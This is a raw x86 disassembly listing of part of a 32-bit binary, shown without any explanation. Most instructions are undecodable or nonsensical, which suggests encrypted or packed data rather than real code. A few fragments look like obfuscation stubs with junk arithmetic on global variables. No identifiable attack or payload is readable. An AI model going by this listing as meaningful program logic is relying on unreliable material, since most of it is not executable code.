  40ce26:	mov    WORD PTR [edx+0x2c],ss
  40ce29:	xchg   esi,eax
  40ce2a:	pop    edx
  40ce2b:	fmul   DWORD PTR [ebx+0x11]
  40ce2e:	dec    ebx
  40ce2f:	scas   al,BYTE PTR es:[edi]
  40ce30:	xor    ebp,DWORD PTR [ecx]
  40ce32:	sbb    dh,al
  40ce34:	int    0x15
  40ce36:	repz cmp al,0xca
  40ce39:	add    eax,DWORD PTR [ebx]
  40ce3b:	cwde   
  40ce3c:	out    0xd4,al
  40ce3e:	jg     0x40cdcb
  40ce40:	mov    eax,0x2c390d47
  40ce45:	in     al,dx
  40ce46:	data16 sub cl,BYTE PTR [ebx-0x62]
  40ce4a:	int3   
  40ce4b:	add    ah,ch
  40ce4d:	mov    ch,0xeb
  40ce4f:	push   ecx
  40ce50:	cmp    BYTE PTR [ecx-0x13],0x3b
  40ce54:	ins    DWORD PTR es:[edi],dx
  40ce55:	repnz lahf 
  40ce57:	in     al,0xcc
  40ce59:	mov    esi,0x2370a773
  40ce5e:	stos   DWORD PTR es:[edi],eax
  40ce5f:	or     BYTE PTR [esi-0x59],0xdf
  40ce63:	cmp    esi,esi
  40ce65:	retf   0x99ed
  40ce68:	ins    DWORD PTR es:[edi],dx
  40ce69:	in     eax,dx
  40ce6a:	cmp    al,0x9a
  40ce6c:	icebp  
  40ce6d:	mov    esi,0x21db8379
  40ce72:	addr16 push ebx
  40ce74:	cmc    
  40ce75:	repz jl 0x40ce05
  40ce78:	mov    ch,0x27
  40ce7a:	pop    eax
  40ce7b:	jo     0x40ce3b
  40ce7d:	loopne 0x40ceac
  40ce7f:	into   
  40ce80:	xor    al,0xf9
  40ce82:	stos   DWORD PTR es:[edi],eax
  40ce83:	fbld   TBYTE PTR ds:0x3a439f42
  40ce89:	aas    
  40ce8a:	shl    BYTE PTR [esp+esi*8-0x7f],1
  40ce8e:	fisubr WORD PTR [edx-0x7]
  40ce91:	jae    0x40ce43
  40ce93:	stc    
  40ce94:	fs or  eax,0x1c6ac774
  40ce9a:	xchg   BYTE PTR [ebp-0x20638d6a],dl
  40cea0:	add    edi,esp
  40cea2:	mov    ebp,DWORD PTR [edx+edx*1]
  40cea5:	div    BYTE PTR [eax+0x68]
  40cea8:	retf   0x4cf
  40ceab:	mov    WORD PTR [ebp-0x30],ss
  40ceae:	ins    DWORD PTR es:[edi],dx
  40ceaf:	hlt    
  40ceb0:	sahf   
  40ceb1:	push   ebx
  40ceb2:	xchg   esp,eax
  40ceb3:	mov    eax,ds:0x428f5200
  40ceb8:	fiadd  WORD PTR [edi]
  40ceba:	jnp    0x40ce8d
  40cebc:	ror    DWORD PTR [edx-0x7a5b4a8f],0x3d
  40cec3:	push   ss
  40cec4:	mov    eax,0x51c1ad06
  40cec9:	fs test dl,0x83
  40cecd:	sbb    edx,ebx
  40cecf:	enter  0xe33d,0x30
  40ced3:	sub    DWORD PTR [ebp+0x7cd43f6b],esi
  40ced9:	mov    ch,0xc5
  40cedb:	push   ecx
  40cedc:	mov    ah,0x42
  40cede:	push   0x7b
  40cee0:	mov    esp,0x176b3a5
  40cee5:	sbb    eax,0x33be333b
  40ceea:	sub    ebx,DWORD PTR [ecx-0xac35706]
  40cef0:	lea    esp,[ecx+0x4a]
  40cef3:	cmp    BYTE PTR [edi+0x3],0xd1
  40cef7:	cmp    eax,0x3c7811bf
  40cefc:	xor    ebx,eax
  40cefe:	push   edi
  40ceff:	out    dx,al
  40cf00:	add    eax,0xfa215ca8
  40cf05:	mov    esp,eax
  40cf07:	push   ds
  40cf08:	push   esp
  40cf09:	inc    ebp
  40cf0a:	xchg   ebp,eax
  40cf0b:	push   edx
  40cf0c:	clc    
  40cf0d:	or     DWORD PTR [esi+0x1c],ecx
  40cf10:	and    ah,ah
  40cf12:	cmp    ebx,ebp
  40cf14:	mov    dh,0xb0
  40cf16:	out    0xd3,eax
  40cf18:	pop    es
  40cf19:	and    al,0x39
  40cf1b:	std    
  40cf1c:	lods   al,BYTE PTR ds:[esi]
  40cf1d:	int    0xda
  40cf1f:	test   eax,0x44c7a019
  40cf24:	sub    eax,0xbf5d9c86
  40cf29:	div    BYTE PTR [ebp-0x65]
  40cf2c:	pop    edx
  40cf2d:	and    ecx,ecx
  40cf2f:	push   ss
  40cf30:	popa   
  40cf31:	stos   DWORD PTR es:[edi],eax
  40cf32:	cmp    cl,ah
  40cf34:	push   0xd
  40cf36:	mov    ds:0x7dcfa8ee,eax
  40cf3b:	out    0xff,eax
  40cf3d:	pop    ebp
  40cf3e:	loop   0x40cfb4
  40cf40:	xchg   edx,eax
  40cf41:	push   edi
  40cf42:	or     BYTE PTR [eax],cl
  40cf44:	mov    cl,bh
  40cf46:	mov    esi,0x6231d3c3
  40cf4b:	je     0x40cf1c
  40cf4d:	add    DWORD PTR [ebp+0x12c6cfc4],edi
  40cf53:	pushf  
  40cf54:	cmp    al,BYTE PTR [eax+0x586ef91b]
  40cf5a:	test   eax,0xda64a1f7
  40cf5f:	test   eax,0x61fe49cb
  40cf64:	push   ss
  40cf65:	test   eax,0x543a6210
  40cf6a:	cwde   
  40cf6b:	xor    bl,ah
  40cf6d:	jle    0x40cf05
  40cf6f:	and    eax,0x232b28a6
  40cf74:	push   edi
  40cf75:	xor    DWORD PTR [ebx],ebx
  40cf77:	jmp    0x93de:0xfab317a7
  40cf7e:	scas   al,BYTE PTR es:[edi]
  40cf7f:	cli    
  40cf80:	jb     0x40cf5e
  40cf82:	mov    BYTE PTR [ecx+0x567d6512],cl
  40cf88:	push   es
  40cf89:	in     eax,dx
  40cf8a:	fisttp WORD PTR [ebx+0xf]
  40cf8d:	test   BYTE PTR [ebp-0x1a],dl
  40cf90:	(bad)  
  40cf91:	(bad)  
  40cf92:	mov    eax,0x800f1c81
  40cf97:	jmp    0x40b5ee
  40cf9c:	push   ebp
  40cf9d:	mov    ebp,esp
  40cf9f:	sub    esp,0x60
  40cfa2:	sbb    DWORD PTR ds:0x42afc5,0x18d1
  40cfac:	mov    eax,DWORD PTR [ebp+0x8]
  40cfaf:	xor    DWORD PTR ds:0x42aff9,0x42aedd
  40cfb9:	jmp    0x40d211
  40cfbe:	ror    esp,1
  40cfc0:	mov    dh,0xc5
  40cfc3:	fcmovbe st,st(1)
  40cfc5:	(bad)  [esi]
  40cfc7:	push   ds
  40cfc8:	aad    0x62
  40cfca:	xor    eax,0x2a77e1d3
  40cfcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cfd0:	js     0x40d04a
  40cfd2:	xor    eax,0x3778787e
  40cfd7:	bound  eax,QWORD PTR [ebp+eax*4+0x2ebc9508]
  40cfde:	pop    eax
  40cfdf:	out    0x38,eax
  40cfe1:	clc    
  40cfe2:	mov    ebp,0x81dd64c3
  40cfe7:	jp     0x40d043
  40cfe9:	(bad)  
  40cfea:	mov    edi,0x59a1ac4a
  40cfef:	mov    cl,BYTE PTR [edi+0x3]
  40cff2:	fdiv   QWORD PTR [ebp+edi*1-0xc]
  40cff6:	xor    eax,0x8a6987bd
  40cffb:	aaa    
  40cffc:	or     ecx,DWORD PTR [eax+0x68]
  40cfff:	cli    
  40d000:	cmp    al,0x81
  40d002:	into   
  40d003:	aam    0x9
  40d005:	mov    ch,ch
  40d007:	dec    esp
  40d008:	mov    bl,0x85
  40d00a:	lods   al,BYTE PTR ds:[esi]
  40d00b:	xchg   esi,eax
  40d00c:	aam    0x2
  40d00e:	pop    eax
  40d00f:	sub    eax,0x9a1414ce
  40d014:	sbb    bl,BYTE PTR ds:[edx-0x1167db26]
  40d01b:	mov    fs,WORD PTR [edi]
  40d01d:	push   0x30f74eb4
  40d022:	ins    DWORD PTR es:[edi],dx
  40d023:	dec    ebp
  40d024:	jl     0x40d065
  40d026:	jae    0x40d01c
  40d028:	xor    eax,0x807289e2
  40d02d:	ins    DWORD PTR es:[edi],dx
  40d02e:	scas   eax,DWORD PTR es:[edi]
  40d02f:	inc    ebp
  40d030:	(bad)  
  40d031:	jmp    0x9ff2867e
  40d036:	in     eax,dx
  40d037:	jo     0x40cff8
  40d039:	or     al,0x6d
  40d03b:	mov    ah,0x36
  40d03d:	hlt    
  40d03e:	cmp    DWORD PTR [ebp-0x53],ecx
  40d041:	out    dx,al
  40d042:	mov    edx,0xf30c9452
  40d047:	repnz fisttp DWORD PTR [eax]
  40d04a:	pusha  
  40d04b:	test   eax,0x7335e9f6
  40d050:	inc    ebp
  40d051:	or     BYTE PTR [edi+0x70],ch
  40d054:	stc    
  40d055:	cwde   
  40d056:	add    al,bl
  40d058:	inc    ebp
  40d059:	int3   
  40d05a:	addr16 fs rol ebx,cl
  40d05e:	mov    edi,0x31c3e35
  40d063:	ins    DWORD PTR es:[edi],dx
  40d064:	mov    al,0x4c
  40d066:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d067:	dec    ebp
  40d068:	stos   BYTE PTR es:[edi],al
  40d069:	gs xlat BYTE PTR fs:[ebx]
  40d06c:	add    BYTE PTR [edi+edx*1],bh
  40d06f:	xchg   BYTE PTR [eax+0x6e38564b],dl
  40d075:	add    eax,0x9add0ad3
  40d07a:	in     eax,0xd4
  40d07c:	mov    esi,0xcc918c52
  40d081:	popf   
  40d082:	xchg   ebp,edx
  40d084:	add    bh,BYTE PTR [edi-0x494b9810]
  40d08a:	inc    ebp
  40d08b:	(bad)
  40d08f:	ret    0x9a6d
  40d092:	les    edx,FWORD PTR [ebx]
  40d094:	(bad)  
  40d095:	mov    ecx,0xfccbdaeb
  40d09a:	fild   QWORD PTR [edx-0x234fe8ea]
  40d0a0:	and    eax,0x71df10f3
  40d0a5:	fbstp  TBYTE PTR [eax+0x65ae9e10]
  40d0ab:	out    0xaf,al
  40d0ad:	pop    edx
  40d0ae:	mov    bl,al
  40d0b0:	call   0xa422:0xe22b9b76
  40d0b7:	popa   
  40d0b8:	(bad)  
  40d0b9:	frstor [ebx+0x61d3fe80]
  40d0bf:	rol    DWORD PTR ds:0x5bb5583c,0xf3
  40d0c6:	sar    edi,cl
  40d0c8:	ins    BYTE PTR es:[edi],dx
  40d0c9:	sahf   
  40d0ca:	int3   
  40d0cb:	clc    
  40d0cc:	ins    BYTE PTR es:[edi],dx
  40d0cd:	mov    ecx,0xc914c7a2
  40d0d2:	xor    al,0xd
  40d0d4:	cmp    eax,0xd22ccdbd
  40d0d9:	test   eax,0xce7d0d63
  40d0de:	push   ecx
  40d0df:	int    0xea
  40d0e1:	test   eax,0xdd212f96
  40d0e6:	sub    eax,0x1dd5c73b
  40d0eb:	jbe    0x40d137
  40d0ed:	mov    ds:0x43ca356a,eax
  40d0f2:	dec    edi
  40d0f3:	pusha  
  40d0f4:	add    DWORD PTR [ebx-0x29],eax
  40d0f7:	cwde   
  40d0f8:	inc    BYTE PTR [esp+edx*8]
  40d0fb:	xor    esp,ebp
  40d0fd:	aaa    
  40d0fe:	int3   
  40d0ff:	mov    dl,BYTE PTR [ebx-0x76]
  40d102:	inc    ebp
  40d103:	or     eax,0x712fa701
  40d108:	ret    
  40d109:	bound  ebp,QWORD PTR [ebp-0x73a9513d]
  40d10f:	pop    eax
  40d110:	mov    eax,ds:0x9d6915b7
  40d115:	pop    edx
  40d116:	pop    eax
  40d117:	popf   
  40d118:	dec    ebp
  40d119:	lods   al,BYTE PTR ds:[esi]
  40d11a:	test   eax,0x4573d03
  40d11f:	sbb    ch,cl
  40d121:	push   0xffffffbb
  40d123:	out    dx,eax
  40d124:	pop    eax
  40d125:	ret    0xf4b0
  40d128:	push   ebx
  40d129:	push   eax
  40d12a:	(bad)  
  40d12c:	ins    DWORD PTR es:[edi],dx
  40d12d:	sub    al,0xd8
  40d12f:	mov    ch,0xd4
  40d131:	imul   BYTE PTR [ecx+0x59]
  40d134:	in     eax,dx
  40d135:	inc    ebx
  40d136:	aas    
  40d137:	adc    eax,0x54afd58b
  40d13c:	sub    DWORD PTR [eax+0x5b],ebx
  40d13f:	(bad)  
  40d140:	push   ebx
  40d141:	test   DWORD PTR [eax],esp
  40d143:	mov    esi,0x8a2631d4
  40d148:	xor    ch,BYTE PTR [esi-0x476c44ea]
  40d14e:	cmp    BYTE PTR [esi],al
  40d150:	mov    eax,0x644fae8d
  40d155:	scas   al,BYTE PTR es:[edi]
  40d156:	xor    eax,edx
  40d158:	fisttp DWORD PTR [edi+0x615598bb]
  40d15e:	popf   
  40d15f:	lds    ebx,FWORD PTR ds:0x6fc2b2a6
  40d165:	repnz lock retf 
  40d168:	jmp    0x301d1cba
  40d16d:	cld    
  40d16e:	push   edx
  40d16f:	fistp  WORD PTR ds:0x5b51d6b1
  40d175:	adc    eax,0x9236416d
  40d17a:	(bad)
  40d17d:	pop    es
  40d17e:	or     BYTE PTR [ebx-0x4368a864],0x8f
  40d185:	clc    
  40d186:	aad    0xe
  40d188:	fild   DWORD PTR [eax]
  40d18a:	lahf   
  40d18b:	mov    eax,ds:0x6b536ac9
  40d190:	(bad)  
  40d191:	(bad)  
  40d192:	mov    esp,0x6493d5f2
  40d197:	push   ebp
  40d198:	adc    edx,DWORD PTR [edi+eiz*4+0x79]
  40d19c:	mov    ah,BYTE PTR [eax+0x1b2a0578]
  40d1a2:	mov    ah,0xe8
  40d1a4:	aas    
  40d1a5:	xchg   BYTE PTR [ebp+0x41227495],ch
  40d1ab:	call   0xa3ce8389
  40d1b0:	dec    ecx
  40d1b1:	popa   
  40d1b2:	test   BYTE PTR [edi],bh
  40d1b4:	push   0x8f18c6c5
  40d1b9:	xor    al,0xe8
  40d1bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d1bc:	mov    dh,0xf6
  40d1be:	xchg   esi,eax
  40d1bf:	loope  0x40d23d
  40d1c1:	ror    DWORD PTR [esi-0x7c],cl
  40d1c4:	fwait
  40d1c5:	push   ebp
  40d1c6:	pop    ds
  40d1c7:	and    al,0x62
  40d1c9:	int3   
  40d1ca:	and    esi,esp
  40d1cc:	mov    ah,0x2f
  40d1ce:	ds mov edx,db5
  40d1d2:	mov    bh,0xf7
  40d1d4:	sbb    BYTE PTR [edx],bl
  40d1d6:	mov    ebp,DWORD PTR [edi+0x31]
  40d1d9:	out    dx,eax
  40d1da:	add    DWORD PTR ds:0x94f249c3,0xa822aee
  40d1e4:	hlt    
  40d1e5:	(bad)  
  40d1e6:	sbb    al,0x6b
  40d1e8:	push   ds
  40d1e9:	mov    ds:0xec0a86c9,al
  40d1ee:	pop    eax
  40d1ef:	and    BYTE PTR [ebx+0x50],0x22
  40d1f3:	bound  esp,QWORD PTR [edx-0x2]
  40d1f6:	and    DWORD PTR [edi],edi
  40d1f8:	rcl    DWORD PTR [edi+ecx*2+0x13ece41b],0xcc
  40d200:	mov    edx,DWORD PTR [ebx]
  40d202:	test   al,0x53
  40d204:	gs jne 0x40d26a
  40d207:	cld    
  40d208:	ror    BYTE PTR [edi],0x4c
  40d20b:	mov    cl,0x75
  40d20d:	popa   
  40d20e:	nop
  40d20f:	mov    eax,DWORD PTR [ebx]
  40d211:	push   ebx
  40d212:	push   esi
  40d213:	and    DWORD PTR ds:0x42af35,0x0
  40d21d:	jmp    0x40d22f
  40d222:	mov    ebx,DWORD PTR ds:0x42af35
  40d228:	inc    ebx
  40d229:	mov    DWORD PTR ds:0x42af35,ebx
  40d22f:	cmp    DWORD PTR ds:0x42af35,0x1d
  40d236:	jae    0x40d254
  40d23c:	cmp    DWORD PTR ds:0x42af35,0x26
  40d243:	jne    0x40d24f
  40d249:	call   DWORD PTR ds:0x41d24c
  40d24f:	jmp    0x40d222
  40d254:	mov    esi,0x7510850
  40d259:	movzx  ebx,WORD PTR ds:0x42aef5
  40d260:	xor    ebx,DWORD PTR ds:0x42aedd
  40d266:	mov    DWORD PTR ds:0x42aef5,ebx
  40d26c:	xor    eax,esi
  40d26e:	or     ebx,0x7ad4
  40d274:	mov    ebx,0x327298
  40d279:	adc    DWORD PTR ds:0x42af3d,0x42aff9
  40d283:	add    eax,ebx
  40d285:	sub    DWORD PTR ds:0x42b009,0x2a37
  40d28f:	push   edi
  40d290:	mov    DWORD PTR [ebp-0x18],eax
  40d293:	adc    DWORD PTR ds:0x42aff9,0x18
  40d29d:	mov    edi,DWORD PTR [ebp+0x8]
  40d2a0:	neg    DWORD PTR ds:0x42afc5
  40d2a6:	xor    edi,esi
  40d2a8:	jmp    0x40d500
  40d2ad:	int    0xca
  40d2af:	iret   
  40d2b0:	retf   0xd9db
  40d2b3:	(bad)  
  40d2b5:	and    ah,ah
  40d2b7:	push   ecx
  40d2b8:	pusha  
  40d2b9:	loop   0x40d253
  40d2bb:	add    ebp,ecx
  40d2bd:	out    0xa5,eax
  40d2bf:	js     0x40d339
  40d2c1:	xor    eax,0x3e78787e
  40d2c6:	sbb    esp,DWORD PTR [esp+0x487e62fd]
  40d2cd:	dec    esp
  40d2ce:	fst    DWORD PTR [ecx+0x5a]
  40d2d1:	neg    DWORD PTR [ecx-0x45930564]
  40d2d7:	test   BYTE PTR [esi+0x72],ch
  40d2da:	pushf  
  40d2db:	cmp    bh,BYTE PTR [ebp-0x28]
  40d2de:	xchg   esp,eax
  40d2df:	add    dl,BYTE PTR [esi]
  40d2e1:	adc    DWORD PTR [ecx-0x49],eax
  40d2e4:	jl     0x40d2cf
  40d2e6:	jae    0x40d35f
  40d2e8:	mov    ds:0x97024069,al
  40d2ed:	jl     0x40d2fa
  40d2ef:	pop    edx
  40d2f0:	cmp    al,0x77
  40d2f2:	xchg   ebx,eax
  40d2f3:	xor    DWORD PTR [esi],esi
  40d2f5:	xor    esi,esp
  40d2f7:	cmp    bl,BYTE PTR [esi+0x861f94b]
  40d2fd:	lods   eax,DWORD PTR ds:[esi]
  40d2fe:	dec    ebx
  40d2ff:	ins    BYTE PTR es:[edi],dx
  40d300:	mov    dl,0xc9
  40d302:	(bad)  
  40d303:	(bad)  
  40d304:	mov    eax,ebp
  40d306:	mov    edx,0xc6c9f87b
  40d30b:	fxch   st(0)
  40d30d:	mov    edi,0x395b5f49
  40d312:	shr    BYTE PTR [eax+0x1537ef77],0x1e
  40d319:	in     al,dx
  40d31a:	cmp    al,0x8b
  40d31c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d31d:	pop    eax
  40d31e:	fst    QWORD PTR [esi-0x1744057e]
  40d324:	(bad)  
  40d325:	mov    ebx,0xd4fc624a
  40d32a:	jne    0x40d3ab
  40d32c:	pop    ss
  40d32d:	sub    al,0xf9
  40d32f:	dec    edx
  40d330:	pop    esp
  40d331:	and    al,ch
  40d333:	bound  eax,QWORD PTR [ecx+0x5c]
  40d336:	mov    bl,0xb8
  40d338:	cmp    ebx,DWORD PTR [edx]
  40d33a:	xor    eax,0xb9f1a8f9
  40d33f:	xchg   edx,eax
  40d340:	ret    0x20d7
  40d343:	or     edx,esp
  40d345:	test   DWORD PTR [edx+0x54797ff0],0x91be6ad0
  40d34f:	lods   eax,DWORD PTR ds:[esi]
  40d350:	idiv   DWORD PTR [ecx-0x40a4f365]
  40d356:	jp     0x40d2ff
  40d358:	outs   dx,BYTE PTR ds:[esi]
  40d359:	add    BYTE PTR [esi+0x22],dh
  40d35c:	(bad)  
  40d35d:	and    al,0x4e
  40d35f:	pop    ebx
  40d360:	call   0x718e:0x99c9389c
  40d367:	cmp    bh,BYTE PTR [ebp+0x464d77f1]
  40d36d:	repz das 
  40d36f:	cmp    eax,ebx
  40d371:	mov    al,0x3a
  40d373:	sub    eax,0x3701a70d
  40d378:	pop    es
  40d379:	sub    esp,esp
  40d37b:	xor    BYTE PTR [eax],0x32
  40d37e:	inc    eax
  40d37f:	es pop esp
  40d381:	mov    dh,dl
  40d383:	push   esi
  40d384:	xor    ebx,DWORD PTR [edx+0x0]
  40d387:	xchg   esp,edx
  40d389:	jns    0xc6b1dd39
  40d38f:	out    dx,al
  40d390:	xor    al,0x35
  40d392:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d393:	cld    
  40d394:	or     al,0x8c
  40d396:	sbb    al,0x8a
  40d398:	mov    ah,ah
  40d39a:	bound  edx,QWORD PTR [edx+ebp*2+0x51]
  40d39e:	jne    0x40d374
  40d3a0:	xchg   ebx,eax
  40d3a1:	out    0x26,al
  40d3a3:	mov    cl,0xa5
  40d3a5:	mov    eax,DWORD PTR [ebx+0xe]
  40d3a8:	mov    al,ds:0x70836d95
  40d3ad:	stos   BYTE PTR es:[edi],al
  40d3ae:	mov    WORD PTR [eax+0x34],?
  40d3b1:	aam    0xc8
  40d3b3:	push   ecx
  40d3b4:	bound  ecx,QWORD PTR [ebp+0x13]
  40d3b7:	(bad)  
  40d3b8:	adc    DWORD PTR [ecx+0x1c],ecx
  40d3bb:	loop   0x40d422
  40d3bd:	aad    0x83
  40d3bf:	cmp    dl,dh
  40d3c1:	jmp    0x40d382
  40d3c3:	(bad)  
  40d3c4:	scas   al,BYTE PTR es:[edi]
  40d3c5:	mov    edi,0xb24edbc9
  40d3ca:	push   cs
  40d3cb:	and    ch,0xad
  40d3ce:	and    dh,BYTE PTR [edx]
  40d3d0:	xor    eax,0x16b89e51
  40d3d5:	test   eax,0x1bf2fa58
  40d3da:	imul   edi,edi,0x1b2d501d
  40d3e0:	add    BYTE PTR [edx+0x7],ch
  40d3e3:	ins    DWORD PTR es:[edi],dx
  40d3e4:	outs   dx,DWORD PTR ds:[esi]
  40d3e5:	fucomp st(5)
  40d3e7:	sub    eax,0x7cebca07
  40d3ec:	jge    0x40d38c
  40d3ee:	inc    esp
  40d3ef:	push   ebp
  40d3f0:	push   ebx
  40d3f1:	test   BYTE PTR [ebp-0x80],dl
  40d3f4:	cmp    bl,BYTE PTR [ecx]
  40d3f6:	sub    DWORD PTR [edi],edx
  40d3f8:	push   ss
  40d3f9:	lahf   
  40d3fa:	int3   
  40d3fb:	dec    ecx
  40d3fc:	or     DWORD PTR [eax-0x72f56f01],edx
  40d402:	mov    bl,BYTE PTR [edx*2+0x72e8f64b]
  40d409:	mov    esp,0x8a576361
  40d40e:	jbe    0x40d3c4
  40d410:	mov    eax,DWORD PTR [ebp-0x60]
  40d413:	push   ds
  40d414:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d415:	dec    esp
  40d416:	xor    esp,ebp
  40d418:	movsx  esi,BYTE PTR [edx+0x2e]
  40d41c:	stc    
  40d41d:	shl    DWORD PTR [ebx-0x5495c5e5],1
  40d423:	mov    bh,0xf4
  40d425:	or     ch,BYTE PTR [ebp-0x27612e74]
  40d42b:	push   es
  40d42c:	lock pusha 
  40d42e:	pop    ds
  40d42f:	(bad)  
  40d430:	or     al,0x33
  40d432:	push   esi
  40d433:	push   0x7be6d403
  40d438:	test   eax,0x93ad005c
  40d43d:	dec    ecx
  40d43e:	ds pushf 
  40d440:	pop    es
  40d441:	ret    0x51e5
  40d444:	lgdtd  [edi+0xd]
  40d448:	cmp    DWORD PTR [ebp+0xdea613b],edx
  40d44e:	sbb    al,0x51
  40d450:	mov    ch,0x78
  40d452:	xchg   edi,eax
  40d453:	xor    al,0x68
  40d455:	xor    ecx,esi
  40d457:	cli    
  40d458:	push   0xf26a61ee
  40d45d:	sbb    esi,edx
  40d45f:	clc    
  40d460:	xor    al,0xb5
  40d462:	adc    eax,0x696e4a3c
  40d467:	push   esp
  40d468:	iret   
  40d469:	or     BYTE PTR [esi-0x54d13933],cl
  40d46f:	pop    edx
  40d470:	and    DWORD PTR [ebx-0x78a5646b],edx
  40d476:	daa    
  40d477:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d478:	mov    ebx,0x14d94b95
  40d47d:	fld    st(5)
  40d47f:	cmp    al,ah
  40d481:	mov    al,ds:0x2199a196
  40d486:	outs   dx,DWORD PTR ds:[esi]
  40d487:	mov    bl,0x10
  40d489:	jne    0x40d4dc
  40d48b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d48c:	xchg   ecx,eax
  40d48d:	inc    ebp
  40d48e:	out    dx,al
  40d48f:	loopne 0x40d453
  40d491:	imul   ebp,DWORD PTR [edx+0x5632aabd],0xb8cc6a72
  40d49b:	div    BYTE PTR [ecx+0x3e]
  40d49e:	add    BYTE PTR [edx+0x7cdca798],cl
  40d4a4:	mov    eax,0xc283b6be
  40d4a9:	cmp    BYTE PTR [edi],bl
  40d4ab:	mov    al,ds:0x52f68e99
  40d4b0:	mov    DWORD PTR gs:[esi],esp
  40d4b3:	lea    eax,[ebx]
  40d4b5:	cmp    eax,edi
  40d4b7:	pushf  
  40d4b8:	xor    al,0x95
  40d4ba:	sahf   
  40d4bb:	mov    al,ds:0xf7c5af9f
  40d4c0:	sub    BYTE PTR [ebx+0x662240cb],dh
  40d4c6:	ficom  DWORD PTR [edx]
  40d4c8:	push   ebp
  40d4c9:	ret    0x16bd
  40d4cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4cd:	cmp    al,0x3
  40d4cf:	out    dx,al
  40d4d0:	inc    ecx
  40d4d1:	int    0x71
  40d4d3:	lods   eax,DWORD PTR ds:[esi]
  40d4d4:	mov    eax,ds:0xaf711f9c
  40d4d9:	sub    cl,BYTE PTR [esi+eiz*8]
  40d4dc:	lods   eax,DWORD PTR ds:[esi]
  40d4dd:	sbb    DWORD PTR [esi-0x9],ecx
  40d4e0:	push   ecx
  40d4e1:	xlat   BYTE PTR ds:[ebx]
  40d4e2:	inc    esi
  40d4e3:	or     eax,0x35c65bf
  40d4e8:	jns    0x40d567
  40d4ea:	in     al,dx
  40d4eb:	std    
  40d4ec:	pop    esi
  40d4ed:	cmp    al,0x1
  40d4ef:	rcr    BYTE PTR [esi-0x6161996],0xa5
  40d4f6:	test   eax,0xfb962941
  40d4fb:	pop    esi
  40d4fc:	sar    DWORD PTR [ebp+0x45c7cab1],cl
  40d502:	hlt    
  40d503:	clc    
  40d504:	test   DWORD PTR [eax+edi*8+0x38f045c7],ebx
  40d50b:	xchg   DWORD PTR [eax+edi*8-0x508ada7f],ebx
  40d512:	inc    edx
  40d513:	add    BYTE PTR [ebp+0x30042af],al
  40d519:	sti    
  40d51a:	jmp    0x40e985
  40d51f:	cmp    edi,0x3f
  40d522:	jne    0x40d55a
  40d528:	mov    eax,0x337e
  40d52d:	mov    eax,ds:0x41e966
  40d532:	mov    eax,DWORD PTR [eax]
  40d534:	mov    DWORD PTR [ebp-0x14],eax
  40d537:	mov    eax,ds:0x41eb6e
  40d53c:	mov    DWORD PTR ds:0x42aee9,0x45db
  40d546:	mov    eax,DWORD PTR [eax]
  40d548:	mov    DWORD PTR [ebp-0x18],eax
  40d54b:	mov    DWORD PTR ds:0x42af4d,0x1d30
  40d555:	jmp    0x40e979
  40d55a:	mov    DWORD PTR ds:0x42afb5,0x19ca
  40d564:	jmp    0x40d7bc
  40d569:	leave  
  40d56a:	ret    
  40d56b:	enter  0xd6c6,0xd9
  40d56f:	fld    st(3)
  40d571:	int    0x93
  40d573:	fdiv   st,st(0)
  40d575:	dec    ecx
  40d576:	push   ss
  40d577:	stos   BYTE PTR es:[edi],al
  40d578:	and    ebx,DWORD PTR [ebx+ebp*4+0x7e357878]
  40d57f:	js     0x40d5f9
  40d581:	clc    
  40d582:	pusha  
  40d583:	into   
  40d584:	outs   dx,BYTE PTR ds:[esi]
  40d585:	sbb    al,0x16
  40d587:	mov    eax,esi
  40d589:	sbb    ch,BYTE PTR [edi-0x4]
  40d58c:	arpl   WORD PTR [edi],sp
  40d58e:	mov    WORD PTR ds:[eax-0x25],?
  40d592:	fdivr  QWORD PTR [edx-0x53]
  40d595:	and    BYTE PTR [ebx+0x77],ch
  40d598:	dec    eax
  40d599:	test   al,0x6f
  40d59b:	xchg   ecx,eax
  40d59d:	mov    ebx,0x2c30149f
  40d5a2:	scas   eax,DWORD PTR es:[edi]
  40d5a3:	idiv   BYTE PTR [eax]
  40d5a5:	mov    ecx,0xcff3e74e
  40d5aa:	pop    ds
  40d5ab:	nop
  40d5ac:	inc    edx
  40d5ad:	lahf   
  40d5ae:	pop    es
  40d5af:	arpl   di,si
  40d5b1:	mov    ebp,0x19181546
  40d5b6:	or     al,0xc7
  40d5b8:	in     al,0x1e
  40d5ba:	mov    al,0x43
  40d5bc:	mov    bl,BYTE PTR [ebx+eiz*4+0x79]
  40d5c0:	dec    ecx
  40d5c1:	mov    ecx,DWORD PTR ds:0x93df8c0e
  40d5c7:	sub    ebp,ecx
  40d5c9:	and    DWORD PTR [edi+0x5ccbda0e],0x116fae8a
  40d5d3:	(bad)  
  40d5d4:	xchg   esi,eax
  40d5d5:	push   edx
  40d5d6:	fimul  WORD PTR [eax]
  40d5d8:	jb     0x40d561
  40d5da:	xchg   ebp,eax
  40d5db:	shr    cl,1
  40d5dd:	(bad)  
  40d5de:	rol    BYTE PTR [ebp+ebx*1+0x6fec1b57],1
  40d5e5:	gs push 0x2f300fa6
  40d5eb:	addr16 fcmovbe st,st(4)
  40d5ee:	inc    DWORD PTR [ebx]
  40d5f0:	mov    eax,ds:0x45f80039
  40d5f5:	sar    DWORD PTR [ebp+0x6df5c6df],0x5
  40d5fc:	sub    BYTE PTR [eax],dh
  40d5fe:	pop    edx
  40d5ff:	(bad)  [eax-0x4fc646ce]
  40d605:	sub    cl,BYTE PTR [eax-0x75]
  40d608:	adc    eax,0x209886cb
  40d60d:	data16 loope 0x40d59d
  40d610:	and    bh,BYTE PTR [ecx-0xe19ecd]
  40d616:	fwait
  40d617:	mov    al,ds:0x7c7e4d4a
  40d61c:	test   BYTE PTR [edx-0x64229903],dl
  40d622:	push   0xffffffa8
  40d624:	in     eax,0x83
  40d626:	mov    ch,0x9f
  40d628:	idiv   DWORD PTR [esi]
  40d62a:	jle    0x40d672
  40d62c:	arpl   bp,di
  40d62e:	inc    edi
